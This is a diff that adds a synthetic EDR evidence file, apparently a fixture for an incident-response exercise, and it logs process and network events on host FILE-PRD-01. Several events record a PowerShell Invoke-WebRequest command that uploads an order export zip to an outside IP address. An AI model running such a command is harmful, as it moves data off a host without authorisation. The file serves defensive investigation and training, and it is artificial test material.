@@ -1,0 +1,17 @@
+{
+  "evidence_id": "E-EDR-012",
+  "type": "edr_process",
+  "source": "SentinelNode EDR",
+  "host": "FILE-PRD-01",
+  "synthetic": true,
+  "collection_window_ist": "2026-09-05T12:25:00+05:30/2026-09-05T13:10:00+05:30",
+  "events": [
+    {"time_ist": "2026-09-05T12:29:36+05:30", "pid": 2140, "process": "svchost.exe", "cmdline": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule", "parent": "services.exe", "parent_pid": 548, "user": "NT AUTHORITY\\SYSTEM", "sha256": "SYNTHETIC-c80fe0d90d3441a6ff14d7d9fa4e181808d4ced458639a238cefe4128c6c9b79", "synthetic": true},
+    {"time_ist": "2026-09-05T12:30:38+05:30", "pid": 7240, "process": "cmd.exe", "cmdline": "cmd /c powershell Invoke-WebRequest -Uri https://185.220.101.47:8443/upload -Method Post -InFile C:\\Windows\\Temp\\order_export_2026.zip", "parent": "explorer.exe", "parent_pid": 5872, "user": "VISTARA\\svc_mon", "sha256": "SYNTHETIC-421b259958319a9c2cf02250bb3fa40471d3817d6cf496e65df95e460be9fa18", "synthetic": true},
+    {"time_ist": "2026-09-05T12:30:41+05:30", "pid": 7288, "process": "powershell.exe", "cmdline": "powershell Invoke-WebRequest -Uri https://185.220.101.47:8443/upload -Method Post -InFile C:\\Windows\\Temp\\order_export_2026.zip", "parent": "cmd.exe", "parent_pid": 7240, "user": "VISTARA\\svc_mon", "sha256": "SYNTHETIC-c80d0c59ce1bca43ba7e6c1c9825451763c92753b8fdca0e343d12c20369eba0", "synthetic": true},
+    {"time_ist": "2026-09-05T12:31:02+05:30", "event_kind": "network_connect", "pid": 7288, "process": "powershell.exe", "cmdline": "powershell Invoke-WebRequest -Uri https://185.220.101.47:8443/upload -Method Post -InFile C:\\Windows\\Temp\\order_export_2026.zip", "parent": "cmd.exe", "parent_pid": 7240, "user": "VISTARA\\svc_mon", "dst_ip": "185.220.101.47", "dst_port": 8443, "protocol": "tcp", "sha256": "SYNTHETIC-e2673f8eb99ae501c3b62bd34e80d2627adf06dae3a3df13cef6fae5859e0613", "synthetic": true},
+    {"time_ist": "2026-09-05T12:45:47+05:30", "event_kind": "network_connect", "pid": 7288, "process": "powershell.exe", "cmdline": "powershell Invoke-WebRequest -Uri https://185.220.101.47:8443/upload -Method Post -InFile C:\\Windows\\Temp\\order_export_2026.zip", "parent": "cmd.exe", "parent_pid": 7240, "user": "VISTARA\\svc_mon", "dst_ip": "185.220.101.47", "dst_port": 8443, "protocol": "tcp", "sha256": "SYNTHETIC-e2673f8eb99ae501c3b62bd34e80d2627adf06dae3a3df13cef6fae5859e0613", "synthetic": true},
+    {"time_ist": "2026-09-05T13:01:33+05:30", "event_kind": "network_connect", "pid": 7288, "process": "powershell.exe", "cmdline": "powershell Invoke-WebRequest -Uri https://185.220.101.47:8443/upload -Method Post -InFile C:\\Windows\\Temp\\order_export_2026.zip", "parent": "cmd.exe", "parent_pid": 7240, "user": "VISTARA\\svc_mon", "dst_ip": "185.220.101.47", "dst_port": 8443, "protocol": "tcp", "sha256": "SYNTHETIC-e2673f8eb99ae501c3b62bd34e80d2627adf06dae3a3df13cef6fae5859e0613", "synthetic": true},
+    {"time_ist": "2026-09-05T13:04:58+05:30", "pid": 1876, "process": "spoolsv.exe", "cmdline": "C:\\Windows\\System32\\spoolsv.exe", "parent": "services.exe", "parent_pid": 548, "user": "NT AUTHORITY\\SYSTEM", "sha256": "SYNTHETIC-732fb46c78465a12f5b15f8df626f6993c76e62c5a6366ba83db3372f8df0647", "synthetic": true}
+  ]
+}
